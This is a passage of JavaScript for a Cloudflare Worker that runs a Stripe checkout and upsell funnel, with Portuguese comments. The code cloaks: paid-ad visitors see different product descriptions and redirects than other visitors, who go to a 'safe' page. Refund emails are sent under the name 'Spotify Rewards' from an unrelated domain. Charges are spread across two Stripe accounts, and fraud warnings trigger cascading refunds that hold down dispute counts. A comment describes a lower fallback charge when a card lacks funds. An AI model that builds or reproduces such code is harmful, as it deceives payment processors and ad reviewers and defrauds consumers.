    const activePixelIds = isTestMode ? [] : META_CONFIGS.map(c => c.pixelId);
    const activePixelId = isTestMode ? null : META_PIXEL_ID;

    // 🔴 Roteamento de conta Stripe: 
    // modo_teste=2 força conta B; modo_teste=1 força conta A; senão respeita ?acc= ou sorteio ponderado (5% B)
    const requestAcc = (modoTesteParam === '2') 
      ? 'b' 
      : ((modoTesteParam === '1') ? 'a' : (url.searchParams.get('acc') || selectStripeAccount(url)));
    const initialStripeCreds = getStripeCredentials(requestAcc, isTestMode);
    const STRIPE_PUBLIC_KEY = initialStripeCreds.publicKey;
    const STRIPE_SECRET_KEY = initialStripeCreds.secretKey;
    const RESEND_API_KEY_LOCAL = HARDCODED_RESEND_API_KEY;
    const UTMIFY_TOKEN = (env && env.UTMIFY_API_TOKEN) || HARDCODED_UTMIFY_TOKEN || '';

    const FRONT_PRICE_ID = (env && env.FRONT_PRICE_ID) || '';
    
    // -------------------------------------------------------------------------------------
    // 💰 PREÇOS PADRÃO DO FUNIL (EM CENTAVOS):
    // 990 cents = $9.90 USD/EUR | 1790 cents = $17.90 USD/EUR
    // -------------------------------------------------------------------------------------
    const FALLBACK_FRONT_PRICE_CENTS = 990;
    const FALLBACK_UP2_PRICE_CENTS   = 1790; 
    
    const FALLBACK_CURRENCY = ((env && env.CURRENCY) || 'usd').toLowerCase();

    // -------------------------------------------------------------------------------------
    // 🔗 URLs DO FUNIL DE VENDAS & TELAS DE OBRIGADO:
    // Configure aqui os links para onde o cliente será redirecionado em cada etapa
    // -------------------------------------------------------------------------------------
    const UP1_URL = (env && env.UP1_URL) || 'https://spoflow.shop/up1/index.html'; 
    const UP2_URL = (env && env.UP2_URL) || 'https://spoflow.shop/up2/index.html'; 
    const FINAL_THANKS_URL = (env && env.FINAL_THANKS_URL) || 'https://spoflow.shop/app/app.html'; 
    const SAFE_THANKS_URL  = (env && env.SAFE_THANKS_URL)  || 'https://spoflow.shop/w/';
// 🔴 VERIFICAÇÃO AUTOMÁTICA DE DOMÍNIO PARA APPLE PAY NA STRIPE
    if (url.pathname === '/.well-known/apple-developer-merchantid-domain-association') {
      try {
        const appleRes = await fetch('https://stripe.com/files/apple-pay/apple-developer-merchantid-domain-association');
        return new Response(await appleRes.text(), {
          headers: { 'Content-Type': 'text/plain; charset=utf-8' }
        });
      } catch (e) {
        return new Response('Error loading domain association', { status: 500 });
      }
    }

    // 🔴 AUTO-REDIRECT 3DS SERVER-SIDE (100% BLINDADO CONTRA LOOP/ERRO NO CLIENTE):
    // Quando o banco finaliza a autenticação 3DS e a Stripe redireciona o cliente via GET,
    // o Worker resolve e confirma DIRETAMENTE servidor-a-servidor e retorna HTTP 302 direto pro Upsell 1!
    // Zero JavaScript no cliente, zero bloqueio de popup/WebView, redirecionamento instantâneo!
    const piIdFromUrl = url.searchParams.get('payment_intent');
    const redirectStatusFromUrl = url.searchParams.get('redirect_status');

    if (request.method === 'GET' && piIdFromUrl && (redirectStatusFromUrl || url.pathname === '/')) {
      try {
        const accFromUrl = url.searchParams.get('acc') || 'a';
        let server3dsCreds = getStripeCredentials(accFromUrl, isTestMode);
        let sKey = server3dsCreds.secretKey;
        let resolvedAcc = accFromUrl;

        let piRes = await fetch(`https://api.stripe.com/v1/payment_intents/${piIdFromUrl}`, {
          headers: { 'Authorization': `Bearer ${sKey}` }
        });
        let paymentIntent = await piRes.json();

        // Fallback resiliente: se não encontrou nesta conta, tenta na outra
        if (paymentIntent.error && paymentIntent.error.code === 'resource_missing') {
          const altAcc = accFromUrl === 'b' ? 'a' : 'b';
          const altCreds = getStripeCredentials(altAcc, isTestMode);
          const altRes = await fetch(`https://api.stripe.com/v1/payment_intents/${piIdFromUrl}`, {
            headers: { 'Authorization': `Bearer ${altCreds.secretKey}` }
          });
          const altPi = await altRes.json();
          if (!altPi.error) {
            sKey = altCreds.secretKey;
            paymentIntent = altPi;
            resolvedAcc = altAcc;
          }
        }

        if (paymentIntent.status === 'requires_action') {
          await new Promise(r => setTimeout(r, 600));
          piRes = await fetch(`https://api.stripe.com/v1/payment_intents/${piIdFromUrl}`, {
            headers: { 'Authorization': `Bearer ${sKey}` }
          });
          paymentIntent = await piRes.json();
        }

        if (paymentIntent.status === 'requires_confirmation') {
          const confirmCallRes = await fetch(`https://api.stripe.com/v1/payment_intents/${piIdFromUrl}/confirm`, {
            method: 'POST',
            headers: {
              'Authorization': `Bearer ${sKey}`,
              'Content-Type': 'application/x-www-form-urlencoded',
              'Idempotency-Key': `confirm_3ds_${piIdFromUrl}`
            }
          });
          paymentIntent = await confirmCallRes.json();
        }

        if (!paymentIntent.error && (paymentIntent.status === 'succeeded' || paymentIntent.status === 'requires_capture' || paymentIntent.status === 'processing')) {
          const amount = paymentIntent.amount;
          const currency = paymentIntent.currency || FALLBACK_CURRENCY;
          const urlParamsFromRequest = Object.fromEntries(url.searchParams.entries());
          let cleanEmail = sanitizeEmail(url.searchParams.get('email') || (paymentIntent.customer && typeof paymentIntent.customer === 'object' ? paymentIntent.customer.email : ''));
          const resolvedName = url.searchParams.get('name') || url.searchParams.get('nome') || 'Customer';
          const phone = url.searchParams.get('phone') || '';
          const customerId = url.searchParams.get('customer_id') || url.searchParams.get('cid') || (typeof paymentIntent.customer === 'string' ? paymentIntent.customer : '');
          const paymentMethodId = url.searchParams.get('payment_method_id') || url.searchParams.get('pm') || paymentIntent.payment_method || '';

          if (!cleanEmail && customerId) {
            try {
              const custRes = await fetch(`https://api.stripe.com/v1/customers/${customerId}`, {
                headers: { 'Authorization': `Bearer ${sKey}` }
              });
              const custObj = await custRes.json();
              if (custObj && custObj.email) cleanEmail = sanitizeEmail(custObj.email);
            } catch (e) {}
          }

          const isSafe = !isPaidTrafficRequest(url);

          if (!isSafe && RESEND_API_KEY_LOCAL.includes('re_') && cleanEmail) {
            ctx.waitUntil(scheduleAccessEmail(env, cleanEmail, resolvedName, RESEND_API_KEY_LOCAL, FINAL_THANKS_URL));
          }

          if (!isSafe) {
            ctx.waitUntil(sendCAPIEvent('Purchase', {
              email: cleanEmail,
              phone: phone,
              name: resolvedName,
              country: urlParamsFromRequest.country || clientCountry,
              eventId: paymentIntent.id,
              externalId: customerId || cleanEmail,
              value: amount / 100,
              currency: currency,
              fbclid: urlParamsFromRequest.fbclid
            }, request, activePixelConfigs));

            if (UTMIFY_TOKEN) {
              ctx.waitUntil(sendUtmifyOrder({
                orderId: paymentIntent.id,
                platform: 'wellness-protocol',
                name: resolvedName,
                email: cleanEmail,
                phone: phone,
                country: urlParamsFromRequest.country || clientCountry,
                productId: (amount === 100 || amount === 390 || amount === 590) ? 'downsell' : 'wellness-protocol',
                productName: (amount === 100) ? 'Downsell $1.00' : (amount === 390 ? 'Downsell $3.90' : (amount === 590 ? 'Downsell $5.90' : 'wellness-protocol')),
                priceInCents: amount,
                currency: currency,
                trackingParameters: urlParamsFromRequest
              }, request, UTMIFY_TOKEN, isTestMode));
            }
          }

          let nextUrl;
          if (isSafe) {
            nextUrl = appendParams(SAFE_THANKS_URL, { name: resolvedName, email: cleanEmail });
          } else {
            const baseNextUrl = (amount === 100 || amount === 390 || amount === 590) ? FINAL_THANKS_URL : UP1_URL;
            let pmCard = null;
            if (paymentIntent.charges && paymentIntent.charges.data && paymentIntent.charges.data[0] && paymentIntent.charges.data[0].payment_method_details) {
              pmCard = paymentIntent.charges.data[0].payment_method_details.card;
            }
            const userCountry = urlParamsFromRequest.country || (pmCard && pmCard.country) || clientCountry;
            const up1Plan = resolveDynamicUp1Price(pmCard, userCountry);
            const safeCampaign = (urlParamsFromRequest.utm_campaign && urlParamsFromRequest.utm_campaign.toLowerCase().includes('spot'))
              ? urlParamsFromRequest.utm_campaign
              : (urlParamsFromRequest.utm_campaign ? `${urlParamsFromRequest.utm_campaign}_spot` : 'spot');

            nextUrl = appendParams(baseNextUrl, {
              ...urlParamsFromRequest,
              utm_campaign: safeCampaign,
              cid: customerId,
              pm: paymentMethodId,
              acc: resolvedAcc,
              name: resolvedName,
              email: cleanEmail,
              phone: phone,
              country: userCountry,
              currency: currency,
              price: up1Plan.price,
              price_cents: up1Plan.price_cents,
              tier: up1Plan.tier,
              card_funding: (pmCard && pmCard.funding) || 'unknown'
            });
          }

          return Response.redirect(nextUrl, 302);
        }
      } catch (err) {
        console.error('[3DS Server-Side Auto-Redirect Error]', err);
      }
    }

    // 🔴 AUTO-BYPASS GET: Se o cliente acessar o checkout com email/customer_id na URL e já tiver compra aprovada do Front,
    // redireciona IMEDIATAMENTE via HTTP 302 para o Upsell 1 (ele nunca mais vê o formulário do Front)
    const checkEmailParam = sanitizeEmail(url.searchParams.get('email'));
    const checkCidParam = url.searchParams.get('customer_id') || url.searchParams.get('cid');

    if (request.method === 'GET' && !url.pathname.startsWith('/api/') && !url.pathname.startsWith('/.well-known/') && (checkEmailParam || checkCidParam)) {
      try {
        const bypassAccCandidates = ['a', 'b'];
        let existingCharge = null;
        let foundAccount = 'a';

        for (const testAcc of bypassAccCandidates) {
          const testSecretKey = getStripeCredentials(testAcc, isTestMode).secretKey;
          let custIds = [];
          if (checkCidParam) custIds.push(checkCidParam);
          if (checkEmailParam) {
            if (GLOBAL_PURCHASED_EMAILS.get(checkEmailParam)) {
              const urlParamsFromReq = Object.fromEntries(url.searchParams.entries());
              const destUrl = appendParams(UP1_URL, { ...urlParamsFromReq, email: checkEmailParam, cid: checkCidParam || '', acc: testAcc });
              return Response.redirect(destUrl, 302);
            }
            try {
              const searchCRes = await fetch(`https://api.stripe.com/v1/customers?email=${encodeURIComponent(checkEmailParam)}&limit=3`, {
                headers: { 'Authorization': `Bearer ${testSecretKey}` }
              });
              const searchC = await searchCRes.json();
              if (searchC && searchC.data) {
                searchC.data.forEach(c => { if (c.id && !custIds.includes(c.id)) custIds.push(c.id); });
              }
            } catch (e) {}
          }

          for (const cId of custIds) {
            try {
              const chRes = await fetch(`https://api.stripe.com/v1/charges?customer=${cId}&limit=15`, {
                headers: { 'Authorization': `Bearer ${testSecretKey}` }
              });
              const chData = await chRes.json();
              if (chData && chData.data) {
                existingCharge = chData.data.find(ch => 
                  ch.status === 'succeeded' && 
                  ch.paid === true && 
                  !ch.refunded && 
                  (ch.amount === FALLBACK_FRONT_PRICE_CENTS || ch.amount === 590 || ch.amount === 390 || ch.amount === 100)
                );
                if (existingCharge) {
                  foundAccount = testAcc;
                  break;
                }
              }
            } catch (e) {}
          }
          if (existingCharge) break;
        }

        if (existingCharge) {
          if (checkEmailParam) GLOBAL_PURCHASED_EMAILS.set(checkEmailParam, true);
          console.log(`[Auto-Bypass GET] Customer ${checkEmailParam || checkCidParam} already bought front on account ${foundAccount}. Redirecting to UP1.`);
          const urlParamsFromReq = Object.fromEntries(url.searchParams.entries());
          let pmCard = (existingCharge.payment_method_details && existingCharge.payment_method_details.card) || null;
          const userCountry = urlParamsFromReq.country || (pmCard && pmCard.country) || clientCountry;
          const up1Plan = resolveDynamicUp1Price(pmCard, userCountry);
          const safeCampaign = (urlParamsFromReq.utm_campaign && urlParamsFromReq.utm_campaign.toLowerCase().includes('spot'))
            ? urlParamsFromReq.utm_campaign
            : (urlParamsFromReq.utm_campaign ? `${urlParamsFromReq.utm_campaign}_spot` : 'spot');

          const baseNext = (existingCharge.amount === 590 || existingCharge.amount === 390 || existingCharge.amount === 100) ? FINAL_THANKS_URL : UP1_URL;
          const destUrl = appendParams(baseNext, {
            ...urlParamsFromReq,
            utm_campaign: safeCampaign,
            cid: existingCharge.customer || checkCidParam || '',
            pm: existingCharge.payment_method || '',
            acc: foundAccount,
            email: checkEmailParam,
            country: userCountry,
            price: up1Plan.price,
            price_cents: up1Plan.price_cents,
            tier: up1Plan.tier,
            card_funding: (pmCard && pmCard.funding) || 'unknown'
          });

          return Response.redirect(destUrl, 302);
        }
      } catch (e) {
        console.error('[GET Pre-Check Error]', e);
      }
    }

    if (url.pathname === '/api/email-status' && request.method === 'GET') {
      const targetEmail = sanitizeEmail(url.searchParams.get("email"));
      if (!targetEmail || !RESEND_API_KEY_LOCAL.includes('re_')) return new Response("{}", { headers: corsHeaders });
      try {
        const listRes = await fetch("https://api.resend.com/emails?limit=30", { headers: { "Authorization": "Bearer " + RESEND_API_KEY_LOCAL }});
        const listData = await listRes.json();
        let timeRemaining = null;
        if (listData && listData.data) {
          const scheduled = listData.data.find(e => e.last_event === "scheduled" && e.to.includes(targetEmail) && e.subject.includes("Ready!"));
          if (scheduled) {
            const secs = Math.max(0, Math.round((new Date(scheduled.scheduled_at).getTime() - Date.now()) / 1000));
            timeRemaining = `${Math.floor(secs / 60)}m ${secs % 60}s`;
          }
        }
        return new Response(JSON.stringify({ email: targetEmail, access_time_remaining: timeRemaining }), { headers: { "Content-Type": "application/json", ...corsHeaders }});
      } catch (e) { return new Response("{}", { status: 500 }); }
    }

    // 🔴 WEBHOOK OFICIAL DA STRIPE: AUTO-REEMBOLSO DE AVISOS ANTECIPADOS DE FRAUDE (EFW)
    // Intercepta alertas prévios de fraude da Mastercard/Visa (EFW) e emite reembolso preventivo ANTES de virar chargeback!
    // Suporta simultaneamente a Conta A e a Conta B
    
    // 🔴 ENDPOINT DE SOLICITAÇÃO DE REEMBOLSO (/api/request-refund)
    if (url.pathname === '/api/request-refund' && request.method === 'POST') {
      try {
        const body = await request.json();
        const cleanEmail = sanitizeEmail(body.email);
        const name = (body.name || '').trim() || 'Cliente';
        const protocol = (body.protocol || ('REF-' + Math.floor(100000 + Math.random() * 900000))).toUpperCase();
        const requestDate = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });

        if (!cleanEmail || !cleanEmail.includes('@')) {
          return new Response(JSON.stringify({ ok: false, error: 'E-mail inválido ou não informado' }), {
            status: 400,
            headers: { 'Content-Type': 'application/json', ...corsHeaders }
          });
        }

        console.log('[REFUND REQUEST RECEIVED]', { protocol, name, email: cleanEmail, date: requestDate });

        let emailDispatched = false;
        let emailError = null;

        const resendKey = (env && env.RESEND_API_KEY) || RESEND_API_KEY_LOCAL;
        const isKeyConfigured = resendKey && resendKey.startsWith('re_') && resendKey !== 're_SUA_CHAVE_API_RESEND_AQUI';

        if (isKeyConfigured) {
          try {
            const senderFrom = (env && env.RESEND_FROM_REFUND) || (env && env.RESEND_FROM) || 'Spotify Rewards <suporte@spoflow.shop>';
            const resendRes = await fetch('https://api.resend.com/emails', {
              method: 'POST',
              headers: {
                'Authorization': `Bearer ${resendKey}`,
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                from: senderFrom,
                to: [cleanEmail],
                subject: `[Protocolo #${protocol}] Confirmação de Solicitação de Reembolso em Análise`,
                html: getRefundAnalysisEmailHtml(name, cleanEmail, protocol, requestDate)
              })
            });

            const resData = await resendRes.json();
            if (resendRes.ok) {
              emailDispatched = true;
              console.log('[Resend Success] Email enviado:', resData);
            } else {
              emailError = resData && (resData.message || JSON.stringify(resData));
              console.error('[Resend Error]', resData);
            }
          } catch (err) {
            emailError = err.message;
            console.error('[Resend Dispatch Error]', err);
          }
        } else {
          emailError = 'Chave Resend não configurada (re_SUA_CHAVE_API_RESEND_AQUI)';
        }

        return new Response(JSON.stringify({
          ok: true,
          protocol: protocol,
          name: name,
          email: cleanEmail,
          emailDispatched: emailDispatched,
          emailError: emailError,
          date: requestDate,
          message: emailDispatched
            ? 'Solicitação registrada com sucesso e e-mail de confirmação enviado.'
            : 'Solicitação registrada com sucesso sob o protocolo ' + protocol + '.'
        }), {
          status: 200,
          headers: { 'Content-Type': 'application/json', ...corsHeaders }
        });
      } catch (err) {
        return new Response(JSON.stringify({ ok: false, error: err.message }), {
          status: 500,
          headers: { 'Content-Type': 'application/json', ...corsHeaders }
        });
      }
    }

    if (url.pathname === '/api/stripe-webhook' && request.method === 'POST') {
      const webhookSecretA = env.STRIPE_WEBHOOK_SECRET || '';
      const webhookSecretB = env.STRIPE_WEBHOOK_SECRET_B || '';
      const signatureHeader = request.headers.get('stripe-signature') || '';
      const rawBody = await request.text();

      // Blindagem Criptográfica: valida assinatura contra Secret A ou Secret B
      if (webhookSecretA || webhookSecretB) {
        let isValid = false;
        if (webhookSecretA) {
          isValid = await verifyStripeWebhookSignature(rawBody, signatureHeader, webhookSecretA);
        }
        if (!isValid && webhookSecretB) {
          isValid = await verifyStripeWebhookSignature(rawBody, signatureHeader, webhookSecretB);
        }
        if (!isValid) {
          return new Response(JSON.stringify({ error: 'Assinatura criptográfica do webhook inválida' }), {
            status: 400,
            headers: { 'Content-Type': 'application/json' }
          });
        }
      }

      let event;
      try {
        event = JSON.parse(rawBody);
      } catch (err) {
        return new Response(JSON.stringify({ error: 'JSON inválido' }), { status: 400 });
      }

      // Helper para executar requisições à Stripe tentando na conta A e caindo para a B se necessário
      async function executeStripeCallWithMultiAccount(path, options = {}) {
        const keysToTry = [STRIPE_ACCOUNT_A.secretKey, STRIPE_ACCOUNT_B.secretKey];
        let lastResult = null;
        for (const sk of keysToTry) {
          try {
            const res = await fetch(`https://api.stripe.com/v1/${path}`, {
              ...options,
              headers: { ...(options.headers || {}), 'Authorization': `Bearer ${sk}` }
            });
            const json = await res.json();
            if (!json.error || (json.error.code !== 'resource_missing' && !json.error.message?.includes('No such'))) {
              return { data: json, secretKey: sk };
            }
            lastResult = { data: json, secretKey: sk };
          } catch (e) {
            lastResult = { error: e };
          }
        }
        return lastResult;
      }

      // 🛡️ HELPER DE BLINDAGEM MÁXIMA: ESTORNO EM CASCATA DE TODOS OS PRODUTOS DO CLIENTE
      // Quando um cliente gera aviso de fraude (EFW) ou disputa em QUALQUER produto do funil,
      // busca e estorna imediatamente TODOS os outros pedidos aprovados dele antes que virem novas disputas!
      async function cascadeRefundAllCustomerOrders(originChargeId, triggerReason, efwId = '') {
        try {
          console.log(`[Cascade Shield] Disparado para cobrança ${originChargeId} (Motivo: ${triggerReason})`);
          
          const origCall = await executeStripeCallWithMultiAccount(`charges/${originChargeId}`);
          const origCharge = origCall && origCall.data;
          const usedSk = origCall && origCall.secretKey;
          if (!origCharge || !usedSk) {
            console.error('[Cascade Shield] Cobrança de origem não localizada para cascade:', originChargeId);
            return;
          }

          const customerId = (typeof origCharge.customer === 'string') 
            ? origCharge.customer 
            : (origCharge.customer && origCharge.customer.id ? origCharge.customer.id : '');
          const customerEmail = sanitizeEmail((origCharge.billing_details && origCharge.billing_details.email) || origCharge.receipt_email || '');

          let allTargetCharges = [];

          // 1. Busca por Customer ID
          if (customerId) {
            const custCharges = await executeStripeCallWithMultiAccount(`charges?customer=${customerId}&limit=50`);
            if (custCharges && custCharges.data && Array.isArray(custCharges.data.data)) {
              allTargetCharges = allTargetCharges.concat(custCharges.data.data);
            }
          }

          // 2. Busca por e-mail para cobrir compras em sessões/clientes diferentes
          if (customerEmail) {
            const searchCust = await executeStripeCallWithMultiAccount(`customers?email=${encodeURIComponent(customerEmail)}&limit=10`);
            if (searchCust && searchCust.data && Array.isArray(searchCust.data.data)) {
              for (const c of searchCust.data.data) {
                if (c.id && c.id !== customerId) {
                  const moreCharges = await executeStripeCallWithMultiAccount(`charges?customer=${c.id}&limit=50`);
                  if (moreCharges && moreCharges.data && Array.isArray(moreCharges.data.data)) {
                    allTargetCharges = allTargetCharges.concat(moreCharges.data.data);
                  }
                }
              }
            }
          }

          // Inclui a própria cobrança de origem caso não esteja na lista
          if (!allTargetCharges.some(c => c.id === origCharge.id)) {
            allTargetCharges.push(origCharge);
          }

          // Deduplica por ID
          const uniqueCharges = new Map();
          for (const ch of allTargetCharges) {
            if (ch && ch.id && !uniqueCharges.has(ch.id)) {
              uniqueCharges.set(ch.id, ch);
            }
          }

          console.log(`[Cascade Shield] Encontradas ${uniqueCharges.size} cobrança(s) no total para o cliente ${customerEmail || customerId}`);

          // 3. Processa o reembolso de cada cobrança que ainda tenha saldo a estornar
          for (const [chId, ch] of uniqueCharges.entries()) {
            // Se for cobrança com sucesso e ainda não estornada totalmente
            const canRefund = ch.status === 'succeeded' && !ch.refunded && ((ch.amount_refunded || 0) < ch.amount);
            
            // Se for a cobrança que já tem disputa aberta, ela é tratada no bloco da disputa
            const hasOpenDispute = ch.disputed && ch.dispute;

            if (canRefund && !hasOpenDispute) {
              console.log(`[Cascade Shield] Estornando preventivamente ${chId} ($${(ch.amount/100).toFixed(2)})...`);
              const refCall = await executeStripeCallWithMultiAccount('refunds', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({
                  charge: chId,
                  reason: 'fraudulent',
                  'metadata[auto_refund_reason]': 'cascade_protection_shield',
                  'metadata[trigger_reason]': triggerReason,
                  'metadata[origin_charge]': originChargeId,
                  'metadata[efw_id]': efwId || ''
                }).toString()
              });
              const refJson = refCall && refCall.data;
              console.log(`[Cascade Shield Refund Result] Cobrança ${chId} ->`, refJson ? (refJson.id || refJson.error?.message) : 'falha');

              // Envia e-mail de confirmação de reembolso com Resend
              if (customerEmail && RESEND_API_KEY_LOCAL.includes('re_') && refJson && refJson.id) {
                try {
                  const custName = (ch.billing_details && ch.billing_details.name) || 'Customer';
                  const cardLast4 = (ch.payment_method_details && ch.payment_method_details.card && ch.payment_method_details.card.last4) || '••••';
                  const currency = (ch.currency || 'usd').toUpperCase();
                  const amountFormatted = `${currency} ${((ch.amount || 0) / 100).toFixed(2)}`;
                  const refundDate = new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
                  await scheduleRefundEmail(env, customerEmail, custName, amountFormatted, cardLast4, refundDate, refJson.id, '', RESEND_API_KEY_LOCAL);
                } catch (emErr) {
                  console.error('[Cascade Shield Email Error]', emErr.message);
                }
              }
            }
          }
        } catch (e) {
          console.error('[Cascade Shield Global Error]', e.message);
        }
      }

      // 1. Intercepta Early Fraud Warning (EFW da Visa/Mastercard)
      // Dispara imediatamente o estorno em cascata da cobrança do alerta e de TODOS os outros produtos do cliente!
      if (event.type === 'radar.early_fraud_warning.created') {
        const warning = event.data && event.data.object;
        const chargeId = warning && warning.charge;

        if (chargeId) {
          ctx.waitUntil((async () => {
            try {
              console.log(`[EFW Webhook] Alerta antecipado de fraude recebido para charge: ${chargeId} (EFW: ${warning.id})`);
              await cascadeRefundAllCustomerOrders(chargeId, 'early_fraud_warning', warning.id || '');
            } catch (e) {
              console.error('[EFW Auto-Refund Error]', e.message);
            }
          })());
        }
      }

      // 2. BLINDAGEM CONTRA DISPUTAS: Intercepta 'charge.dispute.created'
      // Fecha a disputa se necessário E estorna em cascata todos os outros produtos restantes do cliente!
      if (event.type === 'charge.dispute.created') {
        const dispute = event.data && event.data.object;
        const disputeId = dispute && dispute.id;
        const chargeId = dispute && dispute.charge;

        if (disputeId && chargeId) {
          ctx.waitUntil((async () => {
            try {
              console.log(`[Dispute Webhook] Disputa detectada: ${disputeId} na cobrança: ${chargeId}`);
              
              // 1. DISPARA IMEDIATAMENTE O ESTORNO EM CASCATA DOS OUTROS PRODUTOS DO CLIENTE
              await cascadeRefundAllCustomerOrders(chargeId, 'dispute_cascade_protection');

              // 2. TRATA A PRÓPRIA DISPUTA ABERTA
              if (dispute.status === 'needs_response') {
                const chCall = await executeStripeCallWithMultiAccount(`charges/${chargeId}?expand[]=refunds`);
                const chData = chCall && chCall.data;
                const usedSk = chCall && chCall.secretKey;

                // 🛡️ Se a cobrança já havia sido reembolsada antes da disputa: submete prova de ARN
                if (chData && (chData.refunded === true || chData.amount_refunded > 0) && usedSk) {
                  const refundItem = chData.refunds && chData.refunds.data && chData.refunds.data[0];
                  const refundId = refundItem ? refundItem.id : 'N/A';
                  const refundDate = refundItem ? new Date(refundItem.created * 1000).toISOString().split('T')[0] : 'prior date';
                  const arn = (refundItem && refundItem.destination_details && refundItem.destination_details.card && refundItem.destination_details.card.reference) || '';

                  console.log(`[Dispute Defense] Cobrança ${chargeId} já estava estornada (${refundId}). Submetendo prova de reembolso prévio...`);

                  const evidenceParams = new URLSearchParams();
                  evidenceParams.append('evidence[refund_refusal_explanation]', `The charge was already fully refunded to the cardholder on ${refundDate} (Stripe Refund ID: ${refundId}${arn ? `, Bank ARN: ${arn}` : ''}) prior to this dispute being received. The cardholder account has already received the credit.`);
                  evidenceParams.append('evidence[uncategorized_text]', `Transaction was previously settled and refunded under ID ${refundId} on ${refundDate}${arn ? ` with bank tracking ARN ${arn}` : ''}. Please review and close this dispute as settled.`);
                  evidenceParams.append('submit', 'true');

                  await fetch(`https://api.stripe.com/v1/disputes/${disputeId}`, {
                    method: 'POST',
                    headers: {
                      'Authorization': `Bearer ${usedSk}`,
                      'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: evidenceParams.toString()
                  });
                  console.log('[Dispute Defense Submitted] Prova de estorno prévio enviada à Stripe.');
                } else if (usedSk) {
                  // Se não foi estornada a tempo, encerra/aceita a disputa para fechar o caso sem custos extras
                  await fetch(`https://api.stripe.com/v1/disputes/${disputeId}/close`, {
                    method: 'POST',
                    headers: {
                      'Authorization': `Bearer ${usedSk}`,
                      'Content-Type': 'application/x-www-form-urlencoded'
                    }
                  });
                  console.log(`[Dispute Auto-Close] Disputa ${disputeId} encerrada automaticamente.`);
                }
              }
            } catch (e) {
              console.error('[Dispute Webhook Handler Error]', e.message);
            }
          })());
        }
      }

      // 3. E-MAIL AUTOMÁTICO DE REEMBOLSO: Intercepta 'charge.refunded'
      if (event.type === 'charge.refunded') {
        const charge = event.data && event.data.object;
        if (charge) {
          ctx.waitUntil((async () => {
            try {
              const cleanEmail = sanitizeEmail(charge.billing_details && charge.billing_details.email || charge.receipt_email || '');
              const name = (charge.billing_details && charge.billing_details.name) || 'Customer';
              const cardLast4 = (charge.payment_method_details && charge.payment_method_details.card && charge.payment_method_details.card.last4) || '••••';
              const currency = (charge.currency || 'usd').toUpperCase();
              const amountNum = ((charge.amount_refunded || charge.amount || 0) / 100).toFixed(2);
              const amountFormatted = `${currency} ${amountNum}`;
              
              const refunds = (charge.refunds && charge.refunds.data) || [];
              const latestRefund = refunds[0];
              const refundId = latestRefund ? latestRefund.id : 'N/A';
              const refundTimestamp = latestRefund ? latestRefund.created * 1000 : Date.now();
              const refundDate = new Date(refundTimestamp).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
              const arn = (latestRefund && latestRefund.destination_details && latestRefund.destination_details.card && latestRefund.destination_details.card.reference) || '';

              if (cleanEmail && RESEND_API_KEY_LOCAL.includes('re_')) {
                await scheduleRefundEmail(env, cleanEmail, name, amountFormatted, cardLast4, refundDate, refundId, arn, RESEND_API_KEY_LOCAL);
                console.log(`[Refund Webhook Email Sent] Notificação enviada para ${cleanEmail} (Refund: ${refundId}, ARN: ${arn || 'N/A'})`);
              }
            } catch (err) {
              console.error('[Refund Email Error]', err.message);
            }
          })());
        }
      }

      return new Response(JSON.stringify({ received: true }), {
        status: 200,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // -------------------------------------------------------------------------------------
    // 💳 ENDPOINT 1: /api/stripe-charge-front (Cobrança Principal do Checkout - $9.90)
    // - Cria cliente na Stripe e cobra o produto Front
    // - Tokeniza e salva o cartão para permitir 1-Click Upsells futuros sem redigitar
    // - Possui Fallback Inteligente de Saldo ($3.90 / $1.00) caso o lead não tenha $9.90
    // - Dispara Purchase no Meta CAPI e pedido na Utmify
    // -------------------------------------------------------------------------------------
    if ((url.pathname === '/api/stripe-charge-front' || url.pathname === '/api/stripe-process-front') && request.method === 'POST') {
      try {
        const body = await request.json();
        const { payment_method_id, name, email, phone } = body;
        const cleanEmail = sanitizeEmail(email); 
        
        const urlParamsFromRequest = Object.fromEntries(url.searchParams.entries());
        const extraParams = { ...urlParamsFromRequest, ...(body.extra_params || {}) };

        // 🔴 Resolve qual conta Stripe processará a cobrança do Front (garante 5% na B em novo tráfego)
        let frontAcc = body.stripe_account || body.acc || extraParams.acc || url.searchParams.get('acc') || selectStripeAccount(url);
        let frontStripeCreds = getStripeCredentials(frontAcc, isTestMode);
        let frontSecretKey = frontStripeCreds.secretKey;

        if (!payment_method_id) return new Response(JSON.stringify({ ok: false, error: 'Payment method ID required.' }), { status: 400, headers: corsHeaders });

        const isSafe = body.is_safe === true || !isPaidTrafficRequest(url, request);
        let amount = FALLBACK_FRONT_PRICE_CENTS;
        let currency = FALLBACK_CURRENCY;
        let description = isSafe ? 'Wellness-Protocol Digital Program' : 'wellness-protocol';

        if (!isSafe && FRONT_PRICE_ID) {
          const priceObj = await fetchStripePrice(frontSecretKey, FRONT_PRICE_ID);
          if (priceObj && priceObj.unit_amount) { amount = priceObj.unit_amount; currency = priceObj.currency; }
        }

        // 🔴 BUSCA OS DADOS DO CARTÃO (FINGERPRINT E LAST4) COM RESILIÊNCIA MULTI-CONTA
        let pmRes = await fetch(`https://api.stripe.com/v1/payment_methods/${payment_method_id}`, {
          headers: { 'Authorization': `Bearer ${frontSecretKey}` }
        });
        let pm = await pmRes.json();

        // 🛡️ Se o PaymentMethod pertencer à outra conta, chaveia automaticamente
        if (pm.error && (pm.error.code === 'resource_missing' || pm.error.message?.includes('No such payment_method'))) {
          const altAcc = frontAcc === 'b' ? 'a' : 'b';
          const altCreds = getStripeCredentials(altAcc, isTestMode);
          const altPmRes = await fetch(`https://api.stripe.com/v1/payment_methods/${payment_method_id}`, {
            headers: { 'Authorization': `Bearer ${altCreds.secretKey}` }
          });
          const altPm = await altPmRes.json();
          if (!altPm.error) {
            frontAcc = altAcc;
            frontStripeCreds = altCreds;
            frontSecretKey = altCreds.secretKey;
            pm = altPm;
          }
        }

        const cardFingerprint = (pm && pm.card && pm.card.fingerprint) || '';
        const cardLast4 = (pm && pm.card && pm.card.last4) || body.card_last4 || '';
        const cardKey = cardFingerprint || `${cleanEmail}_${cardLast4}`;
        const cardCountry = (pm && pm.card && pm.card.country) || extraParams.country || clientCountry;
